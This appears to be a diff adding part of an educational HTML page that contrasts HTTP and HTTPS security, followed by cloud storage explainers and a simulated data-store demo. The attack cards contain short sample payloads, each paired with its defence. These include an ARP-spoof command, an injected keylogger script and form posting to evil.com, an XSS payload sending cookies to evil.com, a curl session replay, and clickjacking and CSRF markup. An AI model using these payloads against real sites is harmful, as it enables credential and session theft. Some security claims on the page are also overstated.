+    <div class="asb-item"><div class="asb-num amber">3</div><div class="asb-label">Partial Risk on HTTPS</div></div>
+    <div class="asb-item"><div class="asb-num" style="color:#cc88ff">TLS 1.3</div><div class="asb-label">HTTPS Shield</div></div>
+  </div>
+
+  <div class="atk-section-title">🔥 Critical Attacks — HTTP Only <span class="http-only-tag">HTTP ONLY</span></div>
+  <div class="atk-type-grid">
+
+    <div class="atk-card">
+      <div class="atk-card-head critical">
+        <div class="atk-card-icon">🕵️</div>
+        <div><div class="atk-card-label">Man-in-the-Middle (MITM)</div><div class="atk-card-severity">Critical — Most Common</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>An attacker positions themselves between the user and the server — intercepting, reading, and modifying all traffic in real time. On public WiFi, this is trivially easy with tools like ARP spoofing.</p>
+        <div class="how">
+<span class="cr">Attacker Setup:</span>
+<span class="cgr">  arp-spoof -i wlan0 -t victim_ip router_ip</span>
+<span class="cy">  All traffic now flows through attacker's machine</span>
+
+<span class="cr">HTTP victim sees:</span>  <span class="cg">http://bank.com ← appears normal</span>
+<span class="cr">Attacker sees:</span>    <span class="cr">username=alice&password=secret123</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> TLS mutual authentication + certificate verification prevents MITM. Any interception breaks the TLS handshake — browser shows certificate error.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head critical">
+        <div class="atk-card-icon">📡</div>
+        <div><div class="atk-card-label">Packet Sniffing</div><div class="atk-card-severity">Critical — Passive Attack</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Attacker uses tools like Wireshark or tcpdump to silently capture all network packets passing through a shared network. No connection hijacking needed — just listen.</p>
+        <div class="how">
+<span class="cr">Tool:</span>    <span class="cy">Wireshark / tcpdump / ettercap</span>
+<span class="cr">Target:</span>  <span class="cy">Any HTTP request on shared WiFi</span>
+
+<span class="cr">Captured:</span>
+<span class="cr">  POST /login: user=admin&pass=admin123</span>
+<span class="cr">  Cookie: session=abc123 (reusable!)</span>
+<span class="cr">  card_number=4111111111111111&cvv=123</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> TLS 1.3 encrypts every byte. Even if attacker captures packets, they see only random-looking ciphertext — AES-256 is mathematically irreversible without session key.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head critical">
+        <div class="atk-card-icon">💉</div>
+        <div><div class="atk-card-label">HTTP Response Injection</div><div class="atk-card-severity">Critical — Code Injection</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Attacker intercepts HTTP responses in-transit and injects malicious HTML/JavaScript into the page before it reaches the browser. The user sees what looks like the legitimate site.</p>
+        <div class="how">
+<span class="cr">Original response:</span>
+<span class="cg">  &lt;h1&gt;Welcome to Bank&lt;/h1&gt;</span>
+
+<span class="cr">Attacker injects:</span>
+<span class="cr">  &lt;script src="http://evil.com/keylogger.js"&gt;</span>
+<span class="cr">  &lt;form action="http://evil.com/steal"&gt;</span>
+<span class="cy">  User now submits credentials to attacker!</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> Encrypted tunnel makes response modification impossible. Any tampering corrupts the TLS MAC (Message Authentication Code) — browser immediately rejects the response.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head critical">
+        <div class="atk-card-icon">🎭</div>
+        <div><div class="atk-card-label">Session Hijacking</div><div class="atk-card-severity">Critical — Account Takeover</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Session cookies transmitted over HTTP are visible in plain text. Attacker steals the session ID and replays it — gaining full authenticated access to the victim's account without knowing the password.</p>
+        <div class="how">
+<span class="cr">Wireshark captures:</span>
+<span class="cr">  Cookie: session=user_auth_token_abc123</span>
+
+<span class="cr">Attacker sends:</span>
+<span class="cr">  curl -H "Cookie: session=user_auth_token_abc123"</span>
+<span class="cr">         http://target.com/dashboard</span>
+<span class="cy">  → Logged in as victim. No password needed.</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> <code>Secure</code> flag ensures cookie only travels over HTTPS. <code>HttpOnly</code> blocks JS access. <code>SameSite=Strict</code> prevents cross-origin replay.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="atk-section-title">⚠️ High-Severity Attacks <span class="http-only-tag">HTTP ONLY</span></div>
+  <div class="atk-type-grid">
+
+    <div class="atk-card">
+      <div class="atk-card-head high">
+        <div class="atk-card-icon">🔄</div>
+        <div><div class="atk-card-label">SSL Stripping / Downgrade</div><div class="atk-card-severity">High — Protocol Downgrade</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Attacker forces a downgrade from HTTPS to HTTP. When a user types a URL without "https://", the initial request is HTTP — attacker intercepts and strips TLS before forwarding to the server.</p>
+        <div class="how">
+<span class="cr">Tool: sslstrip / bettercap</span>
+
+<span class="cgr">User types:</span>     <span class="cg">bank.com ← browser tries HTTP first</span>
+<span class="cr">Attacker strips:</span> <span class="cr">HTTPS redirect → serves HTTP to user</span>
+<span class="cy">Browser shows:</span>  <span class="cy">http://bank.com ← user doesn't notice!</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> HSTS header (<code>Strict-Transport-Security</code>) forces browser to always use HTTPS — even the first request. HSTS Preload lists burn this into browsers.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head high">
+        <div class="atk-card-icon">🛠️</div>
+        <div><div class="atk-card-label">Parameter Tampering (Burp Suite)</div><div class="atk-card-severity">High — Data Manipulation</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>HTTP requests are intercepted and modified before they reach the server. Hidden form fields, prices, user IDs, or permissions can all be altered — and the HTTP server trusts whatever it receives.</p>
+        <div class="how">
+<span class="cr">Burp Suite intercepts POST:</span>
+<span class="cgr">  amount=4999 → </span><span class="cr">amount=1</span>
+<span class="cgr">  user_id=123 → </span><span class="cr">user_id=1 (admin!)</span>
+<span class="cgr">  is_admin=0  → </span><span class="cr">is_admin=1</span>
+
+<span class="cy">HTTP server receives tampered data — trusts it!</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> TLS encryption prevents in-transit modification. Additionally, server-side validation (server-catalog pricing, server-side role checks) eliminates trust in client values.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head high">
+        <div class="atk-card-icon">🎣</div>
+        <div><div class="atk-card-label">DNS Spoofing + HTTP Hijack</div><div class="atk-card-severity">High — Traffic Redirection</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Attacker poisons the DNS cache to resolve a legitimate domain to a malicious IP. Over HTTP, the user's browser has no way to verify the server's identity — attacker serves a fake replica site.</p>
+        <div class="how">
+<span class="cr">DNS Poisoning:</span>
+<span class="cr">  bank.com → attacker's IP (was real server)</span>
+
+<span class="cy">HTTP user visits bank.com:</span>
+<span class="cr">  Sees identical fake site — submits creds</span>
+<span class="cr">  No certificate warning — nothing to verify!</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> SSL/TLS certificate is issued to the domain by a trusted CA. A fake server cannot produce a valid certificate for <code>bank.com</code> — browser shows "NOT SECURE" warning.</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="atk-section-title">🟡 Partial-Risk Attacks <span class="both-tag">ALSO POSSIBLE ON HTTPS</span></div>
+  <div class="atk-type-grid">
+
+    <div class="atk-card">
+      <div class="atk-card-head medium">
+        <div class="atk-card-icon">📝</div>
+        <div><div class="atk-card-label">Cross-Site Scripting (XSS)</div><div class="atk-card-severity">Medium — Application-Layer</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Malicious scripts injected into web pages run in victims' browsers. HTTP makes this easier (no CSP enforcement), but XSS is an application-layer vulnerability that can exist on HTTPS sites too — though HTTPS with security headers significantly reduces risk.</p>
+        <div class="how">
+<span class="cr">Stored XSS payload:</span>
+<span class="cr">  &lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="cy">HTTP: No CSP = script runs freely</span>
+<span class="cg">HTTPS + CSP: default-src 'self' blocks it</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> <code>Content-Security-Policy</code> header blocks inline scripts and untrusted sources. <code>HttpOnly</code> cookies prevent JS theft even if XSS fires.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head medium">
+        <div class="atk-card-icon">🖱️</div>
+        <div><div class="atk-card-label">Clickjacking</div><div class="atk-card-severity">Medium — UI Deception</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Attacker embeds the target site in an invisible iframe overlaid on a malicious page. Users think they're clicking on the decoy site, but actually click on hidden buttons on the target — triggering transfers, account changes, etc.</p>
+        <div class="how">
+<span class="cr">Attacker page embeds target:</span>
+<span class="cr">  &lt;iframe src="http://bank.com/transfer" style="opacity:0"&gt;</span>
+<span class="cy">  User clicks "Win Prize!" button</span>
+<span class="cr">  → Actually clicked bank's "Confirm Transfer"</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> <code>X-Frame-Options: DENY</code> and <code>Content-Security-Policy: frame-ancestors 'none'</code> prevent any site from embedding the page in an iframe.</div>
+      </div>
+    </div>
+
+    <div class="atk-card">
+      <div class="atk-card-head medium">
+        <div class="atk-card-icon">🔁</div>
+        <div><div class="atk-card-label">Cross-Site Request Forgery (CSRF)</div><div class="atk-card-severity">Medium — Session Abuse</div></div>
+      </div>
+      <div class="atk-card-body">
+        <p>Attacker tricks an authenticated user's browser into sending a forged request to the target site. Over HTTP, there's no SameSite cookie protection — any page can silently trigger authenticated actions.</p>
+        <div class="how">
+<span class="cr">Evil site contains:</span>
+<span class="cr">  &lt;img src="http://bank.com/transfer?to=hacker&amt=10000"&gt;</span>
+<span class="cy">  Victim's browser sends this with their session cookie!</span>
+<span class="cr">  HTTP server receives auth'd request — executes transfer</span>
+        </div>
+        <div class="defend">✓ <strong>HTTPS Defense:</strong> <code>SameSite=Strict</code> cookie flag blocks cross-origin requests from carrying the cookie. CSRF tokens add a second layer of validation.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ===== CLOUD STORAGE ===== -->
+<div class="section" id="sec-cloud">
+  <div class="section-title">☁️ Cloud Storage — How Websites Store Data in the Cloud</div>
+  <p class="section-subtitle">From browser to database: understanding cloud-based data storage, security layers, and how HTTPS protects every step</p>
+
+  <div class="cloud-intro">
+    <h3>☁️ What is Cloud Storage for Websites?</h3>
+    <p>When you submit a form on a website, your data doesn't stay on the server in front of you — it travels through multiple cloud layers before reaching its final storage destination. Modern web applications use cloud platforms like <strong style="color:#ffaa44">AWS</strong>, <strong style="color:#66aaff">Google Cloud</strong>, and <strong style="color:#55aaff">Microsoft Azure</strong> to store user data, files, and databases at massive scale — with built-in redundancy, encryption, and global availability. HTTPS is the critical shield protecting data in transit before it ever reaches the cloud.</p>
+  </div>
+
+  <div class="cloud-storage-flow">
+    <h4>🔄 Journey of Your Data: Browser → Cloud Database</h4>
+    <div class="csf-steps">
+      <div class="csf-step"><div class="si">🧑‍💻</div><div class="sl">User's Browser</div><div class="ss">Enters form data</div></div>
+      <div class="csf-arrow">→</div>
+      <div class="csf-step" style="border-color:#378ADD"><div class="si">🔒</div><div class="sl">TLS Encryption</div><div class="ss">HTTPS tunnel created</div></div>
+      <div class="csf-arrow">→</div>
+      <div class="csf-step"><div class="si">🌐</div><div class="sl">CDN / Load Balancer</div><div class="ss">AWS CloudFront / GCP LB</div></div>
+      <div class="csf-arrow">→</div>
+      <div class="csf-step"><div class="si">⚙️</div><div class="sl">Web Server</div><div class="ss">EC2 / App Engine</div></div>
+      <div class="csf-arrow">→</div>
+      <div class="csf-step"><div class="si">🗄️</div><div class="sl">Cloud Database</div><div class="ss">RDS / Firestore / CosmosDB</div></div>
+      <div class="csf-arrow">→</div>
+      <div class="csf-step"><div class="si">📁</div><div class="sl">Object Storage</div><div class="ss">S3 / GCS / Blob</div></div>
+    </div>
+  </div>
+
+  <h3 style="font-size:16px;font-weight:700;margin:24px 0 14px;color:#66aaff;">☁️ Cloud Storage Services — What Each Provider Offers</h3>
+  <div class="cloud-grid">
+
+    <div class="cloud-card">
+      <div class="cloud-card-head">
+        <div class="cloud-card-icon">🟠</div>
+        <div><div class="cloud-card-title">Amazon Web Services (AWS)</div><div class="cloud-card-sub">Most widely used cloud platform</div></div>
+      </div>
+      <div class="cloud-card-body">
+        <p>AWS provides a full stack of storage services used by millions of websites including Netflix, Airbnb, and Instagram.</p>
+        <span class="cloud-tag aws">S3 — Object/File Storage</span>
+        <span class="cloud-tag aws">RDS — Relational DB (MySQL/PostgreSQL)</span>
+        <span class="cloud-tag aws">DynamoDB — NoSQL Database</span>
+        <span class="cloud-tag aws">ElastiCache — In-Memory Cache</span>
+        <span class="cloud-tag aws">Glacier — Archive Storage</span>
+        <div style="margin-top:10px;font-family:'JetBrains Mono',monospace;font-size:10px;background:#0a0f1a;padding:10px;border-radius:6px;color:#7799bb;">
+          <div><span style="color:#ffaa44">User uploads profile photo →</span></div>
+          <div>  Browser → HTTPS → AWS S3 Bucket</div>
+          <div>  URL: https://mybucket.s3.amazonaws.com/user123.jpg</div>
+          <div><span style="color:#44dd88">S3 encrypts at-rest with AES-256 (SSE)</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cloud-card">
+      <div class="cloud-card-head">
+        <div class="cloud-card-head-icon">🔵</div>
+        <div><div class="cloud-card-title">Google Cloud Platform (GCP)</div><div class="cloud-card-sub">Used by YouTube, Google Pay, Spotify</div></div>
+      </div>
+      <div class="cloud-card-body">
+        <p>GCP integrates deeply with Google's AI/ML infrastructure, offering powerful managed storage with automatic encryption.</p>
+        <span class="cloud-tag gcp">Cloud Storage (GCS) — Object Store</span>
+        <span class="cloud-tag gcp">Firestore — NoSQL Real-time DB</span>
+        <span class="cloud-tag gcp">Cloud SQL — Managed MySQL/PostgreSQL</span>
+        <span class="cloud-tag gcp">BigQuery — Data Warehouse</span>
+        <span class="cloud-tag gcp">Memorystore — Redis Cache</span>
+        <div style="margin-top:10px;font-family:'JetBrains Mono',monospace;font-size:10px;background:#0a0f1a;padding:10px;border-radius:6px;color:#7799bb;">
+          <div><span style="color:#66aaff">User submits order form →</span></div>
+          <div>  HTTPS POST → Firestore Document</div>
+          <div>  { userId: "u123", items: [...], total: 4999 }</div>
+          <div><span style="color:#44dd88">Firestore encrypts all data by default</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="cloud-card">
+      <div class="cloud-card-head">
+        <div class="cloud-card-icon">🔷</div>
+        <div><div class="cloud-card-title">Microsoft Azure</div><div class="cloud-card-sub">Enterprise-grade cloud, used by LinkedIn</div></div>
+      </div>
+      <div class="cloud-card-body">
+        <p>Azure is the leading choice for enterprise applications, with strong compliance certifications (ISO 27001, GDPR, HIPAA).</p>
+        <span class="cloud-tag azure">Blob Storage — Files & Media</span>
+        <span class="cloud-tag azure">Azure SQL — Managed SQL Server</span>
+        <span class="cloud-tag azure">Cosmos DB — Multi-model NoSQL</span>
+        <span class="cloud-tag azure">Table Storage — Key-Value Store</span>
+        <span class="cloud-tag azure">Data Lake — Big Data Storage</span>
+        <div style="margin-top:10px;font-family:'JetBrains Mono',monospace;font-size:10px;background:#0a0f1a;padding:10px;border-radius:6px;color:#7799bb;">
+          <div><span style="color:#55aaff">User payment processed →</span></div>
+          <div>  HTTPS → Azure SQL Database</div>
+          <div>  TDE (Transparent Data Encryption) active</div>
+          <div><span style="color:#44dd88">Data encrypted in-transit AND at-rest</span></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <h3 style="font-size:16px;font-weight:700;margin:24px 0 14px;color:#66aaff;">🗄️ How HTTP vs HTTPS Affects Cloud Data Storage</h3>
+  <div class="cloud-compare">
+    <div class="cc-card">
+      <div class="cc-head http-c">⚠ HTTP App — Unsafe Cloud Storage Path</div>
+      <div class="cc-body">
+        <div class="cr">Browser → HTTP (Plain Text) → Server</div>
+        <div class="cgr">                ↓</div>
+        <div class="cr">Data arrives at server UNENCRYPTED</div>
+        <div class="cy">  password: "admin123" (readable)</div>
+        <div class="cy">  card: "4111111111111111" (readable)</div>
+        <div class="cgr">                ↓</div>
+        <div class="cr">Stored in DB without hashing:</div>
+        <div class="cr">  INSERT INTO users VALUES ('admin123', '4111...')</div>
+        <div class="cgr">                ↓</div>
+        <div class="cr">Cloud DB stores PLAIN TEXT passwords</div>
+        <div class="cr">One breach = all users' passwords stolen</div>
+        <br>
+        <div style="color:#ff9944">⚠ Risk at EVERY stage of the pipeline</div>
+      </div>
+    </div>
+    <div class="cc-card">
+      <div class="cc-head https-c">✓ HTTPS App — Secure Cloud Storage Path</div>
+      <div class="cc-body">
+        <div class="cg">Browser → HTTPS (TLS 1.3) → Server</div>
+        <div class="cgr">                ↓</div>
+        <div class="cg">Data arrives at server ENCRYPTED in transit</div>
+        <div class="cg">  password: "admin123" → bcrypt hash</div>
+        <div class="cg">  card: "4111…" → only ****1111 stored</div>
+        <div class="cgr">                ↓</div>
+        <div class="cg">Stored in DB with hashing + masking:</div>
+        <div class="cb">  INSERT INTO users VALUES ('$2b$12$hash...', '****1111')</div>
+        <div class="cgr">                ↓</div>
+        <div class="cg">Cloud DB uses AES-256 Encryption at Rest</div>
+        <div class="cg">Breach = only useless hashes stolen</div>
+        <br>
+        <div style="color:#44dd88">✓ Protected at EVERY stage of the pipeline</div>
+      </div>
+    </div>
+  </div>
+
+  <h3 style="font-size:16px;font-weight:700;margin:24px 0 14px;color:#66aaff;">🌟 Cloud Security Benefits for HTTPS Applications</h3>
+  <div class="cloud-benefit-list">
+    <div class="cbl-item">
+      <div class="cbl-icon">🔐</div>
+      <div><div class="cbl-title">Encryption at Rest</div><div class="cbl-desc">All major cloud DBs (AWS RDS, Firestore, Azure SQL) encrypt stored data automatically using AES-256. Even if storage media is stolen, data is unreadable.</div></div>
+    </div>
+    <div class="cbl-item">
+      <div class="cbl-icon">🌍</div>
+      <div><div class="cbl-title">Geo-Redundancy</div><div class="cbl-desc">Cloud storage automatically replicates your data across multiple geographic regions. If one data center fails, your data survives in another region — 99.99% uptime.</div></div>
+    </div>
+    <div class="cbl-item">
+      <div class="cbl-icon">📊</div>
+      <div><div class="cbl-title">Audit Logging</div><div class="cbl-desc">Cloud platforms like AWS CloudTrail and GCP Audit Logs record every access to your data — who read what, when, from where. Critical for detecting breaches and compliance.</div></div>
+    </div>
+    <div class="cbl-item">
+      <div class="cbl-icon">🛡️</div>
+      <div><div class="cbl-title">IAM & Access Control</div><div class="cbl-desc">Identity and Access Management (IAM) ensures only authorized services and users can access specific storage buckets or database tables. Principle of least privilege.</div></div>
+    </div>
+    <div class="cbl-item">
+      <div class="cbl-icon">🔑</div>
+      <div><div class="cbl-title">Key Management (KMS)</div><div class="cbl-desc">AWS KMS, GCP Cloud KMS, and Azure Key Vault manage encryption keys separately from data. Even a full DB dump is useless without the key — stored in a separate secure vault.</div></div>
+    </div>
+    <div class="cbl-item">
+      <div class="cbl-icon">⚡</div>
+      <div><div class="cbl-title">Auto-Scaling Storage</div><div class="cbl-desc">Cloud storage scales automatically. AWS S3 can store unlimited data; Cloud SQL scales to terabytes. No capacity planning needed — pay only for what you use.</div></div>
+    </div>
+  </div>
+
+  <div style="background:#0a1220;border-radius:12px;padding:20px 24px;border:1px solid #1e3a5f;margin-top:8px;">
+    <div style="color:#66aaff;font-size:14px;font-weight:700;margin-bottom:10px;">📋 Cloud Storage Best Practices — HTTPS + Cloud Together</div>
+    <div style="font-family:'JetBrains Mono',monospace;font-size:11px;line-height:2.2;color:#7799bb;">
+      <div><span style="color:#44dd88">✓</span> Always use HTTPS — encrypt data in transit before it touches the cloud</div>
+      <div><span style="color:#44dd88">✓</span> Enable server-side encryption (SSE) — encrypt data at rest in S3, Blob, GCS</div>
+      <div><span style="color:#44dd88">✓</span> Hash passwords with bcrypt/argon2 — never store plain text in any DB</div>
+      <div><span style="color:#44dd88">✓</span> Use VPC (Virtual Private Cloud) — isolate DB from public internet entirely</div>
+      <div><span style="color:#44dd88">✓</span> Enable automated backups — RDS, Firestore, CosmosDB all support point-in-time recovery</div>
+      <div><span style="color:#44dd88">✓</span> Use IAM roles — never hardcode AWS/GCP credentials in application code</div>
+      <div><span style="color:#44dd88">✓</span> Enable CloudTrail / Audit Logs — monitor every DB read/write for anomalies</div>
+      <div><span style="color:#44dd88">✓</span> Enforce TLS for DB connections — even internal DB connections should use SSL/TLS</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CLOUD DATA STORE ===== -->
+<div class="section" id="sec-cloudstore">
+  <div class="section-title">🗃️ Cloud Data Store — Interactive Demo</div>
+  <p class="section-subtitle">Simulate how your form data travels, transforms, and gets stored in a real cloud database — with and without HTTPS</p>
+
+  <div style="background:linear-gradient(135deg,#0a1628,#112240);border-radius:16px;padding:24px;margin-bottom:24px;border:2px solid #1e4080;">
+    <h3 style="color:#66aaff;font-size:16px;font-weight:800;margin-bottom:8px;">🌐 What is a Cloud Data Store?</h3>
+    <p style="color:#8ab0d0;font-size:13px;line-height:1.7;">A <strong style="color:#66aaff">Cloud Data Store</strong> is a managed database service hosted on a cloud platform (AWS, GCP, Azure) that stores your application's data remotely. Unlike local databases, cloud data stores offer automatic backups, geo-replication, and built-in encryption. Popular options include <span style="color:#ffaa44">AWS DynamoDB</span>, <span style="color:#66aaff">Google Firestore</span>, and <span style="color:#55aaff">Azure Cosmos DB</span>. HTTPS is the first and most critical security layer before data ever reaches these stores.</p>
+  </div>
+
+  <!-- Interactive Demo -->
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:24px;" id="cds-grid">
+    <!-- Form Panel -->
+    <div style="border-radius:16px;border:2px solid #1e4080;overflow:hidden;">
+      <div style="padding:14px 20px;background:linear-gradient(135deg,#0d1f3c,#1a3a6b);color:#66aaff;font-size:13px;font-weight:700;letter-spacing:.5px;">📝 User Data Input</div>
+      <div style="padding:20px;background:#0a1220;">
+        <div class="fg"><label class="fl" style="color:#5577aa;">Username</label><input class="fi" id="cds-user" placeholder="e.g. rahul_sharma" style="background:#0d1f3c;color:#8ab0d0;border-color:#1e4080;"></div>
+        <div class="fg"><label class="fl" style="color:#5577aa;">Password</label><input class="fi" id="cds-pass" type="password" placeholder="Enter password" style="background:#0d1f3c;color:#8ab0d0;border-color:#1e4080;"></div>
+        <div class="fg"><label class="fl" style="color:#5577aa;">Email</label><input class="fi" id="cds-email" placeholder="user@example.com" style="background:#0d1f3c;color:#8ab0d0;border-color:#1e4080;"></div>
+        <div class="fg"><label class="fl" style="color:#5577aa;">Profile Data (JSON)</label><input class="fi" id="cds-profile" placeholder='{"city":"Mumbai","age":25}' style="background:#0d1f3c;color:#8ab0d0;border-color:#1e4080;"></div>
+        <div style="display:flex;gap:10px;margin-top:6px;">
+          <button onclick="cdsStore('http')" style="flex:1;padding:11px;border:2px solid var(--red);border-radius:10px;background:transparent;color:#ff6666;font-family:'Syne',sans-serif;font-size:13px;font-weight:700;cursor:pointer;">⚠ Store via HTTP</button>
+          <button onclick="cdsStore('https')" style="flex:1;padding:11px;border:2px solid #44dd88;border-radius:10px;background:transparent;color:#44dd88;font-family:'Syne',sans-serif;font-size:13px;font-weight:700;cursor:pointer;">✓ Store via HTTPS</button>
+        </div>
+        <div style="margin-top:10px;">
+          <select id="cds-provider" style="width:100%;padding:10px 13px;border:1.5px solid #1e4080;border-radius:8px;background:#0d1f3c;color:#66aaff;font-family:'Syne',sans-serif;font-size:13px;outline:none;">
+            <option value="firestore">🔵 Google Firestore (GCP)</option>
+            <option value="dynamodb">🟠 AWS DynamoDB</option>
+            <option value="cosmos">🔷 Azure Cosmos DB</option>
+          </select>
+        </div>
+      </div>
+    </div>
+
+    <!-- Pipeline Visualization -->
+    <div style="border-radius:16px;border:2px solid #1e4080;overflow:hidden;">
+      <div style="padding:14px 20px;background:linear-gradient(135deg,#0d1f3c,#1a3a6b);color:#66aaff;font-size:13px;font-weight:700;letter-spacing:.5px;">🔄 Live Data Pipeline</div>
+      <div style="padding:16px;background:#080e1a;" id="cds-pipeline">
+        <div style="color:#445566;font-family:'JetBrains Mono',monospace;font-size:11px;text-align:center;padding:40px 0;">Click a Store button to simulate the data pipeline →</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Result Panels -->
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:24px;" id="cds-results">
+    <!-- Transit View -->
+    <div style="border-radius:12px;overflow:hidden;border:1px solid #1e4080;">
+      <div id="cds-transit-head" style="padding:12px 16px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">🌐 In Transit</div>
+      <div style="background:#080e1a;padding:14px;font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.9;min-height:160px;" id="cds-transit">
+        <span style="color:#445566">// Waiting…</span>
+      </div>
+    </div>
+    <!-- Server Processing -->
+    <div style="border-radius:12px;overflow:hidden;border:1px solid #1e4080;">
+      <div style="padding:12px 16px;background:linear-gradient(135deg,#1a2a1a,#2a4a2a);color:#44dd88;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">⚙️ Server Processing</div>
+      <div style="background:#080e1a;padding:14px;font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.9;min-height:160px;" id="cds-server">
+        <span style="color:#445566">// Waiting…</span>
+      </div>
+    </div>
+    <!-- Cloud DB Document -->
+    <div style="border-radius:12px;overflow:hidden;border:1px solid #1e4080;">
+      <div id="cds-db-head" style="padding:12px 16px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;">🗄️ Cloud DB Record</div>
+      <div style="background:#080e1a;padding:14px;font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.9;min-height:160px;" id="cds-db">
+        <span style="color:#445566">// Waiting…</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Stored Records Table -->
+  <div style="background:#080e1a;border-radius:14px;padding:20px;border:1px solid #1e4080;margin-bottom:24px;">
+    <div style="color:#66aaff;font-size:14px;font-weight:700;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;">
+      <span>📊 Simulated Cloud DB — Stored Records</span>
+      <button onclick="cdsClear()" style="padding:6px 14px;border:1px solid #334466;border-radius:6px;background:transparent;color:#5577aa;font-family:'Syne',sans-serif;font-size:11px;cursor:pointer;">Clear All</button>
+    </div>
+    <div id="cds-table-wrap">
+      <div style="color:#334466;font-size:12px;text-align:center;padding:24px;">No records yet — use the form above to simulate storing data.</div>
+    </div>
+  </div>
+
+  <!-- Concept Explainer -->
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px;">
+    <div style="background:#0a1220;border-radius:12px;padding:18px;border:1px solid #1e3a5f;">
+      <div style="font-size:22px;margin-bottom:8px;">🔑</div>
+      <div style="font-size:13px;font-weight:700;color:#66aaff;margin-bottom:6px;">Document ID</div>
+      <div style="font-size:12px;color:#6688aa;line-height:1.6;">Each record in a cloud data store gets a unique auto-generated ID (UUID). This ID is used to retrieve, update, or delete specific records. It's never guessable by attackers.</div>
+    </div>
+    <div style="background:#0a1220;border-radius:12px;padding:18px;border:1px solid #1e3a5f;">
+      <div style="font-size:22px;margin-bottom:8px;">🔒</div>
+      <div style="font-size:13px;font-weight:700;color:#66aaff;margin-bottom:6px;">Encryption at Rest</div>
+      <div style="font-size:12px;color:#6688aa;line-height:1.6;">Cloud data stores like Firestore, DynamoDB, and Cosmos DB automatically encrypt all stored data using AES-256. Even if someone steals the storage disk, data is unreadable without the KMS key.</div>
+    </div>
+    <div style="background:#0a1220;border-radius:12px;padding:18px;border:1px solid #1e3a5f;">
+      <div style="font-size:22px;margin-bottom:8px;">📜</div>
+      <div style="font-size:13px;font-weight:700;color:#66aaff;margin-bottom:6px;">Audit Trail</div>
+      <div style="font-size:12px;color:#6688aa;line-height:1.6;">Cloud data stores log every read/write operation with timestamp, user, and IP. Firestore uses Cloud Audit Logs; DynamoDB uses CloudTrail. Any suspicious access is detected instantly.</div>
+    </div>
+    <div style="background:#0a1220;border-radius:12px;padding:18px;border:1px solid #1e3a5f;">
+      <div style="font-size:22px;margin-bottom:8px;">🌍</div>
+      <div style="font-size:13px;font-weight:700;color:#66aaff;margin-bottom:6px;">Geo-Replication</div>
+      <div style="font-size:12px;color:#6688aa;line-height:1.6;">Data is automatically replicated across multiple regions. If a data center in Mumbai fails, your data is still safe in Singapore and Iowa — ensuring 99.999% availability.</div>
+    </div>
+    <div style="background:#0a1220;border-radius:12px;padding:18px;border:1px solid #1e3a5f;">
+      <div style="font-size:22px;margin-bottom:8px;">🧩</div>
+      <div style="font-size:13px;font-weight:700;color:#66aaff;margin-bottom:6px;">NoSQL Structure</div>
+      <div style="font-size:12px;color:#6688aa;line-height:1.6;">NoSQL cloud stores use flexible JSON-like documents instead of rigid tables. Firestore stores "collections" of "documents". DynamoDB uses "tables" of "items". Data can be nested and schema-free.</div>
+    </div>
+    <div style="background:#0a1220;border-radius:12px;padding:18px;border:1px solid #1e3a5f;">
+      <div style="font-size:22px;margin-bottom:8px;">⚡</div>
+      <div style="font-size:13px;font-weight:700;color:#66aaff;margin-bottom:6px;">Real-Time Sync</div>
+      <div style="font-size:12px;color:#6688aa;line-height:1.6;">Firestore and Cosmos DB support real-time listeners. When a record changes in the cloud store, all connected clients are updated instantly — critical for chat apps, dashboards, and live tracking.</div>
+    </div>
+  </div>
+</div>
+
+
+<div class="section" id="sec-headers">
+  <div class="section-title">Security Headers Comparison</div>
+  <p class="section-subtitle">Response headers set by the HTTPS app that the HTTP app is completely missing</p>
+  <table class="htable">
